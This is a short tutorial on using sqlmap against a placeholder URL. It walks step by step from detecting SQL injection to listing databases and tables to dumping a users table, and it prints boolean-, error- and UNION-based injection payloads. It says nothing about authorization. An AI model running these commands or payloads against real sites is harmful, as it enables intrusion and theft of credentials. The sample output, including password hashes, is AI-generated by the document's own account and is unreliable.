# SQLmap
## 1: Scan target-url that has one or more parameters
-u is one of the most fundamental options to SQLmap, which is first and foremost shorthand for --url
and which basically means that the url given is target. --batch says "Y, Yes" and "Continue" to all prompts during the scan.
```bash
sqlmap -u "http://www.target.com/page.php?id=58" --batch
```
After this you will often be met with something like this
```console
[10:36:01] [INFO] testing connection to the target URL
[10:36:01] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('__cf_bm=hirEvEYfJ9u...NTHQX6z9c4'). Do you want to use those [Y/n] Y
[10:36:01] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:36:02] [WARNING] reflective value(s) found and filtering out
[10:36:02] [INFO] testing if the target URL content is stable
[10:36:02] [WARNING] target URL content is not stable (i.e. content differs).
```
If a vulnerability is found in your target URL, it will look something like this.
```console
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=58 AND 2667=2667

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=58 AND (SELECT 6286 FROM(SELECT COUNT(*),CONCAT(0x71766a6a71,(SELECT (CASE WHEN (6286=6286) THEN 1 ELSE 0 END)),0x71706a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=58 UNION ALL SELECT NULL,NULL,CONCAT(0x71766a6a71,0x536c4b69754f6c4c5145,0x71706a7671)-- -

[12:14:05] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0
```


## 2: After initial scan, then find detailed information on target databases
Here the "-dbs" command is important, as it is the one that finds all available
databases with their names.
```bash
sqlmap -u "http://www.target.com/page.php?id=58" --dbs --batch
```
If the scan is successful, you will perhaps get something like this.
```console
[13:37:00] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] acme_shop_db
```

## 3: Select a database and find tables
It is now time to select one of the databases found in step 2. In this example "acme_shop_db" and see what tables it contains.
Here you use -D to name/select the desired Database and --tables option, to find the tables for the database.
```bash
sqlmap -u "http://www.target.com/page.php?id=58" -D acme_shop_db --tables --batch
```
Where you will then be met with something like this.
```console
Database: acme_shop_db
[4 tables]
+-----------+
| users     |
| products  |
| orders    |
| config    |
+-----------+
```

## 4: Fetch data from the table (dump)
The fourth and last part would then be to retrieve the data you have found through SQLmap which is done like this.
```bash
sqlmap -u "http://www.target.com/page.php?id=58" -D acme_shop_db -T users --dump --batch
```

Which might look something like this (depending on how the database was designed)
```console
Database: acme_shop_db
Table: users
[2 entries]
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 2  | support  | 9a8b7c6d5e4f3g2h1i0j1k2l3m4n5o6p |
+----+----------+----------------------------------+
```
















NOTE: Outputs used as examples of what a real output could look like were generated with AI and not with real Hosts.
